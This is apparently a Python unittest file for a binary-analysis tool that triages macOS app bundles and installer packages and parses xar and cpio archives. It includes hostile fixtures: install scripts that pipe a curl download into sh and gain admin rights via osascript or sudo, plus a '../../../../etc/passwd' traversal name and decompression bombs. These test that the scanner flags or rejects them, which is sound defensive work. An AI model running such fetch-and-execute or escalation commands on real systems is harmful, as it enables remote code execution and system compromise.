"""Bundle triage, flat installer packages and the xar/cpio readers, including hostile input."""
import json
import os
import plistlib
import shutil
import struct
import subprocess
import sys
import tempfile
import unittest
import zlib

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)

from rdis import containers, pkgxar
from rdis.bundle import bundle_triage, is_bundle
from rdis.mcp_server import _handle

C_MAIN = '#include <stdio.h>\nint main(void){ puts("bundle test app"); return 0; }\n'
C_HELPER = 'int helper_value(void){ return 7; }\n'


def make_xar(members, toc_override=None):
    """A minimal xar: members is [(name, bytes)], stored uncompressed."""
    heap, files, offset = b"", [], 0
    for i, (name, data) in enumerate(members, 1):
        files.append(f'<file id="{i}"><name>{name}</name><type>file</type><data><length>{len(data)}</length>'
                     f'<offset>{offset}</offset><size>{len(data)}</size><encoding style="application/octet-stream"/>'
                     f'</data></file>')
        heap += data
        offset += len(data)
    toc = toc_override if toc_override is not None else f'<?xml version="1.0"?><xar><toc>{"".join(files)}</toc></xar>'.encode()
    packed = zlib.compress(toc)
    return struct.pack(">4sHHQQI", b"xar!", 28, 1, len(packed), len(toc), 1) + packed + heap


def odc(name, mode, data):
    nm = name.encode() + b"\0"
    return (b"070707" + b"000000" * 2 + f"{mode:06o}".encode() + b"000000" * 3 + b"000000" + b"00000000000"
            + f"{len(nm):06o}".encode() + f"{len(data):011o}".encode() + nm + data)


def newc(name, mode, data):
    nm = name.encode() + b"\0"
    head = b"070701" + b"".join(f"{v:08x}".encode() for v in (1, mode, 0, 0, 1, 0, len(data), 0, 0, 0, 0, len(nm), 0))
    pad = lambda b: b + b"\0" * (-len(b) % 4)
    return pad(head + nm) + pad(data)


class Readers(unittest.TestCase):
    def test_cpio_odc_and_newc(self):
        for build, trailer in ((odc, odc("TRAILER!!!", 0, b"")), (newc, newc("TRAILER!!!", 0, b""))):
            blob = build("./a.sh", 0o100755, b"echo hi\n") + build("./dir", 0o040755, b"") + build("./b", 0o100644, b"xyz") + trailer
            members = pkgxar.cpio_members(blob)
            self.assertEqual([(n, m & 0o170000, d) for n, m, d in members],
                             [("./a.sh", 0o100000, b"echo hi\n"), ("./dir", 0o040000, b""), ("./b", 0o100000, b"xyz")])

    def test_truncated_and_foreign_cpio_are_rejected(self):
        with self.assertRaises(pkgxar.PkgError):
            pkgxar.cpio_members(odc("x", 0o100644, b"abcdef")[:-3])
        with self.assertRaises(pkgxar.PkgError):
            pkgxar.cpio_members(b"not a cpio archive at all")

    def test_xar_roundtrip_and_flat_member_listing(self):
        with tempfile.TemporaryDirectory() as d:
            p = os.path.join(d, "x.xar")
            with open(p, "wb") as fh:
                fh.write(make_xar([("one", b"first"), ("two", b"second")]))
            self.assertTrue(pkgxar.is_xar(p))
            items = pkgxar.entries(p)
            self.assertEqual([e["path"] for e in items], ["one", "two"])
            self.assertEqual([pkgxar.read_member(p, e) for e in items], [b"first", b"second"])

    def test_hostile_archives_fail_cleanly(self):
        with tempfile.TemporaryDirectory() as d:
            def write(name, data):
                p = os.path.join(d, name)
                with open(p, "wb") as fh:
                    fh.write(data)
                return p
            good = make_xar([("a", b"abc")])
            huge = b"<xar><toc><!--" + b"A" * (80 << 20) + b"--></toc></xar>"
            packed = zlib.compress(huge)
            lying = struct.pack(">4sHHQQI", b"xar!", 28, 1, len(packed), 20, 1) + packed   # header claims a 20-byte TOC
            cases = {"bad magic": write("m", b"nope" + good[4:]),
                     "truncated toc": write("t", good[:35]),
                     "garbage toc": write("g", make_xar([], toc_override=b"\xff\xfe not xml")),
                     "toc larger than the header says and the limit allows": write("b", lying),
                     "header claims a huge toc": write("h", struct.pack(">4sHHQQI", b"xar!", 28, 1, 1 << 40, 1 << 40, 1))}
            for label, path in cases.items():
                with self.subTest(label):
                    with self.assertRaises(pkgxar.PkgError):
                        pkgxar.entries(path)
            outside = {"path": "a", "offset": 0, "length": 999999, "size": 3, "encoding": "application/octet-stream"}
            with self.assertRaises(pkgxar.PkgError):
                pkgxar.read_member(write("ok", good), outside)

    def test_decompression_bomb_in_a_member_is_bounded(self):
        bomb = zlib.compress(b"\0" * (40 << 20))
        entry = {"path": "z", "offset": 0, "length": len(bomb), "size": 40 << 20, "encoding": "application/x-gzip"}
        with tempfile.TemporaryDirectory() as d:
            p = os.path.join(d, "bomb.xar")
            toc = b"<xar><toc></toc></xar>"
            packed = zlib.compress(toc)
            with open(p, "wb") as fh:
                fh.write(struct.pack(">4sHHQQI", b"xar!", 28, 1, len(packed), len(toc), 1) + packed + bomb)
            with self.assertRaises(pkgxar.PkgError):
                pkgxar.read_member(p, entry, limit=1 << 20)

    def test_script_rules_flag_the_dangerous_lines_only(self):
        body = b"#!/bin/sh\necho preparing\ncurl -s https://x.example/a | sh\nsudo launchctl load /Library/LaunchDaemons/a.plist\n"
        info = pkgxar._script_info("postinstall", 0o100755, body, 4096)
        found = {(f["line"], f["rule"]) for f in info["findings"]}
        self.assertIn((3, "downloads code"), found)
        self.assertIn((3, "pipes to a shell"), found)
        self.assertIn((4, "elevates privileges"), found)
        self.assertIn((4, "loads a launch job"), found)
        self.assertFalse([f for f in info["findings"] if f["line"] == 2], "a harmless echo is not flagged")
        self.assertEqual(info["interpreter"], "/bin/sh")


@unittest.skipUnless(shutil.which("cc"), "needs a C compiler")
class RealBundles(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.tmp = tempfile.mkdtemp(prefix="rdis-bundle-")
        app = os.path.join(cls.tmp, "Demo.app", "Contents")
        for sub in ("MacOS", "Frameworks", "Resources"):
            os.makedirs(os.path.join(app, sub))
        for name, text in (("main.c", C_MAIN), ("helper.c", C_HELPER)):
            with open(os.path.join(cls.tmp, name), "w") as fh:
                fh.write(text)
        subprocess.run(["cc", "-o", os.path.join(app, "MacOS", "Demo"), os.path.join(cls.tmp, "main.c")], check=True)
        subprocess.run(["cc", "-shared", "-o", os.path.join(app, "Frameworks", "libhelper.dylib"),
                        os.path.join(cls.tmp, "helper.c")], check=True)
        with open(os.path.join(app, "Info.plist"), "wb") as fh:
            plistlib.dump({"CFBundleIdentifier": "com.example.demo", "CFBundleName": "Demo", "CFBundleShortVersionString": "2.1",
                           "CFBundleExecutable": "Demo", "NSCameraUsageDescription": "to scan codes",
                           "NSAppleEventsUsageDescription": "to talk to Finder",
                           "CFBundleURLTypes": [{"CFBundleURLSchemes": ["demoapp"]}]}, fh)
        with open(os.path.join(app, "Resources", "readme.txt"), "w") as fh:
            fh.write("not a binary\n")
        os.symlink("..", os.path.join(app, "Resources", "loop"))
        cls.signing = bool(shutil.which("codesign"))
        if cls.signing:
            ent = os.path.join(cls.tmp, "ent.plist")
            with open(ent, "wb") as fh:
                plistlib.dump({"com.apple.security.cs.allow-jit": True}, fh)
            subprocess.run(["codesign", "-s", "-", "-f", "--entitlements", ent, os.path.join(app, "MacOS", "Demo")],
                           check=True, capture_output=True)
        cls.app = os.path.join(cls.tmp, "Demo.app")

    @classmethod
    def tearDownClass(cls):
        shutil.rmtree(cls.tmp, ignore_errors=True)

    def rows(self, out):
        return {b["path"]: b for b in out["binaries"]}

    def test_app_bundle_lists_each_binary_once_and_ignores_the_symlink_loop(self):
        out = bundle_triage(self.app)
        self.assertEqual(out["kind"], "app")
        self.assertEqual(sorted(self.rows(out)), ["Contents/Frameworks/libhelper.dylib", "Contents/MacOS/Demo"])
        for row in out["binaries"]:
            self.assertEqual(row["format"], "macho")
            self.assertGreater(row["overall_entropy"], 0)
            self.assertNotIn("error", row)

    def test_info_plist_permissions_and_url_schemes(self):
        plist = bundle_triage(self.app)["plists"][0]
        self.assertEqual(plist["CFBundleIdentifier"], "com.example.demo")
        self.assertEqual(set(plist["usage"]), {"NSCameraUsageDescription", "NSAppleEventsUsageDescription"})
        self.assertEqual(plist["url_schemes"], ["demoapp"])

    @unittest.skipUnless(shutil.which("codesign"), "needs codesign")
    def test_signature_authority_adhoc_and_entitlements(self):
        out = bundle_triage(self.app)
        main = self.rows(out)["Contents/MacOS/Demo"]["signature"]
        self.assertTrue(main["signed"] and main["adhoc"])
        self.assertEqual(main["entitlements"], {"com.apple.security.cs.allow-jit": True})
        self.assertIsNone(main["team_id"])
        self.assertEqual(out["summary"]["permissions_requested"], ["NSAppleEventsUsageDescription", "NSCameraUsageDescription"])
        self.assertEqual(out["summary"]["with_entitlements"], 1)

    def test_cli_table_and_json(self):
        text = subprocess.run([sys.executable, "-m", "rdis", self.app, "--triage"], cwd=ROOT, capture_output=True, text=True)
        self.assertEqual(text.returncode, 0, text.stderr)
        self.assertIn("Contents/MacOS/Demo", text.stdout)
        self.assertIn("asks for NSCameraUsageDescription", text.stdout)
        doc = json.loads(subprocess.run([sys.executable, "-m", "rdis", self.app, "--triage", "--json"], cwd=ROOT,
                                        capture_output=True, text=True).stdout)
        self.assertEqual(doc["summary"]["binaries"], 2)

    def test_triage_tool_accepts_a_bundle(self):
        res = _handle({"method": "tools/call", "params": {"name": "triage", "arguments": {"path": self.app}}})
        self.assertFalse(res.get("isError"))
        self.assertEqual(json.loads(res["content"][0]["text"])["kind"], "app")

    def test_a_single_binary_is_still_triaged_the_old_way(self):
        res = _handle({"method": "tools/call", "params": {"name": "triage", "arguments": {"path": os.path.join(self.app, "Contents", "MacOS", "Demo")}}})
        doc = json.loads(res["content"][0]["text"])
        self.assertIn("sections", doc)
        self.assertFalse(is_bundle(os.path.join(self.app, "Contents", "MacOS", "Demo")))

    @unittest.skipUnless(shutil.which("pkgbuild"), "needs pkgbuild")
    def test_flat_package_scripts_payload_and_binaries(self):
        scripts = os.path.join(self.tmp, "scripts")
        os.makedirs(scripts)
        with open(os.path.join(scripts, "postinstall"), "w") as fh:
            fh.write("#!/bin/bash\ncurl -s https://updates.example.com/a.sh | sh\nosascript -e 'do shell script \"id\" with administrator privileges'\n")
        with open(os.path.join(scripts, "preinstall"), "w") as fh:
            fh.write("#!/bin/sh\necho preparing\n")
        for n in ("postinstall", "preinstall"):
            os.chmod(os.path.join(scripts, n), 0o755)
        root = os.path.join(self.tmp, "payload")
        os.makedirs(os.path.join(root, "Applications"))
        shutil.copytree(self.app, os.path.join(root, "Applications", "Demo.app"), symlinks=True)
        pkg = os.path.join(self.tmp, "demo.pkg")
        subprocess.run(["pkgbuild", "--root", root, "--scripts", scripts, "--identifier", "com.example.demo.pkg",
                        "--version", "2.1", "--install-location", "/", pkg], check=True, capture_output=True)
        self.assertTrue(is_bundle(pkg))
        out = bundle_triage(pkg)
        self.assertEqual(out["kind"], "pkg")
        self.assertEqual(out["components"][0]["identifier"], "com.example.demo.pkg")
        stages = {s["name"]: s for s in out["scripts"]}
        self.assertEqual(set(stages), {"preinstall", "postinstall"})
        self.assertEqual([f["rule"] for f in stages["preinstall"]["findings"]], [])
        rules = {f["rule"] for f in stages["postinstall"]["findings"]}
        self.assertTrue({"downloads code", "pipes to a shell", "runs AppleScript", "elevates privileges"} <= rules)
        self.assertIn("curl -s https://updates.example.com/a.sh", stages["postinstall"]["text"])
        self.assertEqual(stages["postinstall"]["stage"], "post")
        paths = sorted(b["path"] for b in out["binaries"])
        self.assertEqual(paths, ["Applications/Demo.app/Contents/Frameworks/libhelper.dylib", "Applications/Demo.app/Contents/MacOS/Demo"])
        self.assertEqual(out["plists"][0]["usage"]["NSCameraUsageDescription"], "to scan codes")
        self.assertEqual(out["summary"]["scripts_with_findings"], 1)
        if self.signing:
            demo = next(b for b in out["binaries"] if b["path"].endswith("MacOS/Demo"))
            self.assertTrue(demo["signature"]["adhoc"], "the signature survives packaging")
        # the package also opens like any container: the binaries are choices, and one extracts intact
        choices = containers.slices(pkg)
        self.assertEqual(len([c for c in choices if c.get("entry")]), 2)
        pick = next(c for c in choices if c["entry"].endswith("MacOS/Demo"))
        cache = os.path.join(self.tmp, "cache")
        extracted = containers.extract(pkg, pick["entry"], cache_dir=cache)
        with open(os.path.join(self.app, "Contents", "MacOS", "Demo"), "rb") as a, open(extracted, "rb") as b:
            self.assertEqual(a.read(), b.read())
        self.assertTrue(os.path.realpath(extracted).startswith(os.path.realpath(cache)))
        text = subprocess.run([sys.executable, "-m", "rdis", pkg, "--triage"], cwd=ROOT, capture_output=True, text=True).stdout
        self.assertIn("install script postinstall", text)
        self.assertIn("downloads code", text)

    def test_unknown_member_and_traversal_names_do_not_escape_the_cache(self):
        with tempfile.TemporaryDirectory() as d:
            p = os.path.join(d, "t.pkg")
            with open(p, "wb") as fh:
                fh.write(make_xar([("Payload", zlib.compress(b"x")), ("PackageInfo", b"<pkg-info/>")]))
            with self.assertRaises((KeyError, ValueError, pkgxar.PkgError)):
                containers.extract(p, "\x00../../../../etc/passwd", cache_dir=os.path.join(d, "cache"))
            self.assertFalse(os.path.exists(os.path.join(d, "etc")))

    def test_corrupt_package_is_an_error_not_a_crash(self):
        with tempfile.TemporaryDirectory() as d:
            p = os.path.join(d, "bad.pkg")
            with open(p, "wb") as fh:
                fh.write(b"xar!" + b"\x00" * 40)
            with self.assertRaises(ValueError):
                bundle_triage(p)
            out = subprocess.run([sys.executable, "-m", "rdis", p, "--triage"], cwd=ROOT, capture_output=True, text=True)
            self.assertNotEqual(out.returncode, 0)
            self.assertNotIn("Traceback", out.stderr)


if __name__ == "__main__":
    unittest.main()
